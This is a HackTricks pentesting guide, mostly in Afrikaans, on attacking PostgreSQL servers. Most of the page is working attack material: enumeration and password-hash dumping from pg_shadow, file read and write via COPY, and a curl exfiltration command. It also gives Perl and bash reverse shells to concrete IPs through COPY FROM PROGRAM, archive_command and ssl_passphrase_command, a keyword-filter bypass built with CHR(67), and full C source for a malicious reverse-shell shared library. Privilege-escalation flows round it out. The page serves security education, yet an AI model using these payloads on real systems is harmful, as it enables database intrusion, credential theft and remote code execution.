# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Basiese Inligting**

**PostgreSQL** word beskryf as 'n **objek-relasionele databasisstelsel** wat **oopbron** is. Hierdie stelsel gebruik nie net die SQL-taal nie maar verbeter dit ook met addisionele funksies. Dit kan 'n wye verskeidenheid datatipes en operasies hanteer, wat dit 'n veelsydige keuse vir ontwikkelaars en organisasies maak.

**Standaard poort:** 5432, en as hierdie poort reeds in gebruik is lyk dit asof PostgreSQL die volgende poort (5433 waarskynlik) sal gebruik wat nie in gebruik is nie.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Verbind & Basiese Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> As jy **`\list`** uitvoer en 'n databasis met die naam **`rdsadmin`** vind, weet jy dat jy binne 'n **AWS postgresql database** is.

Vir meer inligting oor **hoe om 'n PostgreSQL database te misbruik** kyk:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Outomatiese enumerasie
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Volgens [**this research**](https://www.exploit-db.com/papers/13084), wanneer 'n verbindingspoging misluk, gooi `dblink` 'n `sqlclient_unable_to_establish_sqlconnection`-uitsondering wat 'n verduideliking van die fout bevat. Voorbeelde van hierdie besonderhede word hieronder gelys.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host is af

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port is gesluit
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Poort is oop
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
of
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port is oop of gefilter
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL-funksies is dit tans nie moontlik om besonderhede van uitsonderings te verkry nie. As jy egter direkte toegang tot die PostgreSQL-server het, kan jy die nodige inligting uitkry. As dit nie haalbaar is om gebruikersname en wagwoorde uit die system tables te onttrek nie, kan jy oorweeg om die wordlist attack-metode wat in die vorige afdeling bespreek is, te gebruik — dit kan moontlik positiewe resultate lewer.

## Enumerasie van Voorregte

### Rolle

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol het superuser-bevoegdhede                                                                                                                        |
| rolinherit     | Rol erf outomaties die voorregte van rolle waarvan dit 'n lid is                                                                                    |
| rolcreaterole  | Rol kan meer rolle skep                                                                                                                              |
| rolcreatedb    | Rol kan databases skep                                                                                                                               |
| rolcanlogin    | Rol kan aanmeld. Dit beteken hierdie rol kan as die aanvanklike sessie-owerheidsidentiteit gebruik word                                              |
| rolreplication | Rol is 'n replication role. 'n replication role kan replication connections inisieer en replication slots skep en verwyder.                           |
| rolconnlimit   | Vir rolle wat kan aanmeld, stel dit die maksimum aantal gelyktydige verbindings wat hierdie rol kan maak. -1 beteken geen limiet nie.                |
| rolpassword    | Nie die wagwoord nie (lees altyd as `********`)                                                                                                      |
| rolvaliduntil  | Wagwoord vervaldatum (slegs gebruik vir password authentication); null as geen vervaldatum nie                                                      |
| rolbypassrls   | Rol omseil elke row-level security policy, sien [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) vir meer inligting.       |
| rolconfig      | Rol-spesifieke verstekwaardes vir run-time konfigurasieveranderlikes                                                                                 |
| oid            | ID van rol                                                                                                                                           |

#### Interessante Groepe

- As jy 'n lid is van **`pg_execute_server_program`**, kan jy **programme uitvoer**
- As jy 'n lid is van **`pg_read_server_files`**, kan jy **lêers lees**
- As jy 'n lid is van **`pg_write_server_files`**, kan jy **lêers skryf**

> [!TIP]
> Let wel dat in Postgres 'n **user**, 'n **group** en 'n **role** dieselfde is. Dit hang net af van **hoe jy dit gebruik** en of jy **toelaat dat dit kan login**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabelle
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funksies
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Lêerstelsel-aksies

### Lees gidse en lêers

Vanaf hierdie [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) lede van die gedefinieerde **`DEFAULT_ROLE_READ_SERVER_FILES`** groep (genoem **`pg_read_server_files`**) en **super users** kan die **`COPY`** metode op enige pad gebruik (kyk na `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Onthou dat as jy nie 'n superuser is nie, maar die **CREATEROLE**-toestemmings het, jy jouself **lid van daardie groep kan maak:** 
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Daar is **ander postgres funksies** wat gebruik kan word om **'n lêer te lees of 'n gids te lys**. Net **superusers** en **users met eksplisiete toestemmings** kan dit gebruik:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Jy kan **meer funksies** vind in [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Eenvoudige lêerskryf

Slegs **super users** en lede van **`pg_write_server_files`** kan copy gebruik om lêers te skryf.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Onthou dat as jy nie super user is nie maar die **`CREATEROLE`** toestemming het, kan jy **jouself lid maak van daardie groep:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Onthou dat COPY nie newline chars kan hanteer nie, daarom selfs as jy 'n base64 payload gebruik y**jy moet 'n eenreël stuur**.\
'n Baie belangrike beperking van hierdie tegniek is dat **`copy` nie gebruik kan word om binêre lêers te skryf nie aangesien dit sommige binêre waardes verander.**

### **Binêre lêers oplaai**

Daar is egter **ander tegnieke om groot binêre lêers op te laai:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Opdateer PostgreSQL tabeldata deur plaaslike lêerskryf

As jy die nodige toestemmings het om PostgreSQL-bedienerlêers te lees en te skryf, kan jy enige tabel op die bediener opdateer deur die geassosieerde filenode te oorskryf in [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **Meer oor hierdie tegniek** [**hier**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Vereiste stappe:

1.  Kry die PostgreSQL data directory

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Nota:** As jy nie die huidige data directory pad uit settings kan kry nie, kan jy die hoof PostgreSQL-weergawe navraag doen deur die `SELECT version()` query en probeer om die pad te brute-force. Algemene data directory paaie op Unix-installasies van PostgreSQL is `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. 'n Algemene clusternaam is `main`.

2.  Kry 'n relatiewe pad na die filenode wat met die teiken tabel geassosieer is

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Hierdie query behoort iets soos `base/3/1337` terug te gee. Die volle pad op skyf sal wees `$DATA_DIRECTORY/base/3/1337`, bv. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Laai die filenode af deur die `lo_*` funksies

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Kry die datatipe wat met die teiken tabel geassosieer is

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Gebruik die [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) om die filenode te wysig; stel alle `rol*` boolean-vlagte op 1 vir volle toestemmings.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Hersend die gewysigde filenode via die `lo_*` funksies, en oorskryf die oorspronklike lêer op die skyf

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opsioneel)_ Maak die in-memory tabelkas skoon deur 'n hulpbron-intensiewe SQL query uit te voer

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Jy behoort nou opgedateerde tabelwaardes in die PostgreSQL te sien.

Jy kan ook 'n superadmin word deur die `pg_authid` tabel te wysig. **Sien** [**die volgende afdeling**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE na program**

Sedert[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), slegs **super users** en lede van die groep **`pg_execute_server_program`** kan copy vir RCE gebruik (voorbeeld met exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Voorbeeld om exec uit te voer:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Onthou dat as jy nie super user is nie maar die **`CREATEROLE`** permisse het, kan jy **jouself lid van daardie groep maak:** 
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Meer inligting.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Of gebruik die `multi/postgres/postgres_copy_from_program_cmd_exec` module van **metasploit**.\
Meer inligting oor hierdie kwetsbaarheid [**hier**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Alhoewel dit as CVE-2019-9193 gerapporteer is, het Postges verklaar dit is 'n [kenmerk en sal nie reggemaak word nie](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Om sleutelwoordfilters/WAF te omseil om COPY PROGRAM te bereik

In SQLi-kontekste met gestapelde navrae kan 'n WAF die letterlike sleutelwoord `COPY` verwyder of blokkeer. Jy kan die stelling dinamies konstrueer en dit binne 'n PL/pgSQL DO block uitvoer. Byvoorbeeld, bou die leidende C met `CHR(67)` om naiewe filters te omseil en EXECUTE die saamgestelde opdrag:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
This pattern avoids static keyword filtering and still achieves OS command execution via `COPY ... PROGRAM`. It is especially useful when the application echoes SQL errors and allows stacked queries.

### RCE met PostgreSQL-tale


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE met PostgreSQL extensions

Once you have **learned** from the previous post **how to upload binary files** you could try obtain **RCE uploading a postgresql extension and loading it**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL-konfigurasie-lêer RCE

> [!TIP]
> Die volgende RCE-vektore is veral nuttig in beperkte SQLi-kontekste, aangesien alle stappe deur geneste SELECT-uitsprake uitgevoer kan word

Die konfigurasie-lêer van PostgreSQL is skryfbaar deur die postgres-gebruiker, wat die proses is wat die databasis laat loop, so as superuser kan jy lêers in die lêerstelsel skryf en dus hierdie lêer oorskryf.

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

Die konfigurasie-lêer het 'n paar interessante eienskappe wat tot RCE kan lei:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Path to the private key of the database
- `ssl_passphrase_command = ''` If the private file is protected by password (encrypted) postgresql will **execute the command indicated in this attribute**.
- `ssl_passphrase_command_supports_reload = off` **If** this attribute is **on** the **command** executed if the key is protected by password **will be executed** when `pg_reload_conf()` is **executed**.

Dan sal 'n aanvaller die volgende moet doen:

1. **Dump private key** van die bediener
2. **Encrypt** gedownloade privaat sleutel:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Overwrite**
4. **Dump** die huidige postgresql **konfigurasie**
5. **Overwrite** die **konfigurasie** met die genoemde attribuutkonfigurasie:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Voer uit `pg_reload_conf()`

Terwyl ek dit getoets het, het ek opgemerk dat dit net sal werk as die privaat sleutel-lêer permissies 640 het, dit besit word deur root en deur die groep ssl-cert of postgres (sodat die postgres-gebruiker dit kan lees), en dit geplaas is in _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Nog 'n attribuut in die konfigurasie-lêer wat uitgebuit kan word is `archive_command`.

Vir dit om te werk, moet die `archive_mode` instelling op `'on'` of `'always'` staan. As dit waar is, kan ons die opdrag in `archive_command` oorskryf en dwing om dit uit te voer via die WAL (write-ahead logging) operasies.

Die algemene stappe is:

1. Kontroleer of archive mode aangeskakel is: `SELECT current_setting('archive_mode')`
2. Oorskryf `archive_command` met die payload. Byvoorbeeld, 'n reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Herlaai die konfigurasie: `SELECT pg_reload_conf()`
4. Dwing die WAL-operasie om te hardloop, wat die archive command sal aanroep: `SELECT pg_switch_wal()` of `SELECT pg_switch_xlog()` vir sommige Postgres-weergawes

##### Bewerk postgresql.conf via Large Objects (SQLi-vriendelik)

Wanneer multiline-skrywings nodig is (bv. om verskeie GUCs te stel), gebruik PostgreSQL Large Objects om die konfigurasie heeltemal vanaf SQL te lees en oor te skryf. Hierdie benadering is ideaal in SQLi-kontekste waar `COPY` nie reëlbreuke of binariewe-veilige skrywe hanteer nie.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Dit lewer betroubare OS-opdraguitvoering via `archive_command` as die `postgres`-gebruiker, mits `archive_mode` geaktiveer is. In die praktyk kan die instel van 'n lae `archive_timeout` vinnige aanroep veroorsaak sonder om 'n eksplisiete WAL-switch te benodig.

#### **RCE with preload libraries**

Meer inligting [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

Hierdie aanvalsvector maak voordeel van die volgende konfigurasieveranderlikes:

- `session_preload_libraries` -- biblioteke wat deur die PostgreSQL-bediener by die kliëntverbinding gelaai sal word.
- `dynamic_library_path` -- lys van gidse waar die PostgreSQL-bediener na die biblioteke sal soek.

Ons kan die `dynamic_library_path`-waarde op 'n gids stel wat deur die `postgres`-gebruiker wat die databasis bestuur, geskryf kan word, bv. die `/tmp/`-gids, en 'n kwaadwillige `.so`-lêer daar oplaaI. Vervolgens sal ons die PostgreSQL-bediener dwing om ons pas-opgelaaide biblioteek te laai deur dit in die `session_preload_libraries`-veranderlike in te sluit.

Die aanvalstappe is:

1. Laai die oorspronklike `postgresql.conf` af
2. Voeg die `/tmp/`-gids by die `dynamic_library_path`-waarde in, bv. `dynamic_library_path = '/tmp:$libdir'`
3. Sluit die kwaadwillige biblioteeknaam in die `session_preload_libraries`-waarde in, bv. `session_preload_libraries = 'payload.so'`
4. Kontroleer die hoof-PostgreSQL-weergawe via die `SELECT version()`-query
5. Kompileer die kwaadwillige biblioteekkode met die korrekte PostgreSQL dev-pakket. Voorbeeldkode:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Kompileer die kode:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Laai die kwaadwillige `postgresql.conf` op, geskep in stappe 2–3, en oor-skryf die oorspronklike
7. Laai die `payload.so` uit stap 5 na die `/tmp`-gids op
8. Herlaai die bedienerkonfigurasie deur die bediener te herstart of die `SELECT pg_reload_conf()`-query uit te voer
9. By die volgende DB-verbinding sal jy die reverse shell ontvang.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Volgens die [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

Dus, as jy **`CREATEROLE`**-toestemming het, kan jy jouself toegang verleen tot ander **roles** (wat nie superuser is nie) wat jou die opsie kan gee om lêers te lees en te skryf en opdragte uit te voer:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Wysig Password

Gebruikers met hierdie rol kan ook die **passwords** van ander **non-superusers** **verander**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc na SUPERUSER

Dit is redelik algemeen om te vind dat **lokale gebruikers by PostgreSQL kan aanmeld sonder om enige wagwoord te verskaf**. Daarom, sodra jy **regte om kode uit te voer** versamel het, kan jy hierdie regte misbruik om jouself die `SUPERUSER`-rol toe te ken:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Dit is gewoonlik moontlik as gevolg van die volgende reëls in die **`pg_hba.conf`**-lêer:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) word verduidelik hoe dit moontlik was om te **privesc** in Postgres GCP deur die ALTER TABLE privilege wat aan die gebruiker gegee is, te misbruik.

Wanneer jy probeer om **'n ander gebruiker eienaar van 'n tabel te maak** behoort jy 'n **fout** te kry wat dit verhoed, maar blykbaar het GCP daardie **opsie aan die nie-superuser postgres user** in GCP gegee:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

As jy hierdie idee koppel aan die feit dat wanneer die **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) opdragte op 'n **tabel met 'n index function** uitgevoer word, die **function** as deel van die opdrag aangeroep word met die **tabel eienaar se permissies**, dan is dit moontlik om 'n index met 'n function te skep en eienaarskap-permissies oor daardie tabel aan 'n **super user** te gee, en dan ANALYZE op die tabel te laat loop met die kwaadwillige function wat in staat sal wees om opdragte uit te voer omdat dit die voorregte van die eienaar gebruik.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Begin deur 'n nuwe tabel te skep.
2. Voeg 'n paar irrelevante rekords in die tabel in om data vir die index function te verskaf.
3. Ontwikkel 'n kwaadwillige index function wat 'n code execution payload bevat, wat die uitvoering van ongemagtigde shell commands toelaat.
4. ALTER die tabel se eienaar na "cloudsqladmin", wat GCP se superuser rol is wat uitsluitlik deur Cloud SQL gebruik word om die databasis te bestuur en te onderhou.
5. Voer 'n ANALYZE-operasie op die tabel uit. Hierdie aksie dwing die PostgreSQL-enjin om na die gebruikerskonteks van die tabel se eienaar, "cloudsqladmin", oor te skakel. Gevolglik word die kwaadwillige index function aangeroep met die toestemmings van "cloudsqladmin", waardeur die uitvoering van die vroeër ongemagtigde shell command moontlik word.

In PostgreSQL lyk hierdie vloei ongeveer so:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Dan sal die `shell_commands_results` tabel die uitset van die uitgevoerde kode bevat:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Plaaslike Login

Sommige verkeerd gekonfigureerde postgresql-instansies mag login van enige plaaslike gebruiker toelaat; dit is moontlik om vanaf 127.0.0.1 te login met behulp van die **`dblink` funksie**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Neem kennis dat vir die vorige navraag om te werk **die funksie `dblink` moet bestaan**. As dit nie bestaan nie, kan jy probeer om dit te skep met
>
> ```sql
> CREATE EXTENSION dblink;
> ```

As jy die wagwoord het van 'n gebruiker met meer voorregte, maar die gebruiker mag nie vanaf 'n eksterne IP aanmeld nie, kan jy die volgende funksie gebruik om navrae as daardie gebruiker uit te voer:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Dit is moontlik om te kontroleer of hierdie funksie bestaan met:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Aangepaste gedefinieerde funksie met** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters kon privesc uitvoer binne 'n postgres-instansie wat deur IBM verskaf is, omdat hulle **hierdie funksie met die SECURITY DEFINER flag gevind het**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Soos [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) word 'n funksie met **SECURITY DEFINER word uitgevoer** met die voorregte van die **gebruiker wat dit besit**. Daarom, as die funksie **kwetsbaar is vir SQL Injection** of sekere **geprivilegieerde aksies met parameters wat deur die aanvaller beheer word** uitvoer, kan dit misbruik word om **voorregte binne postgres op te skaal**.

In die reël 4 van die vorige kode kan jy sien dat die funksie die **SECURITY DEFINER** flag het.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
En voer dan **voer kommando's uit**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

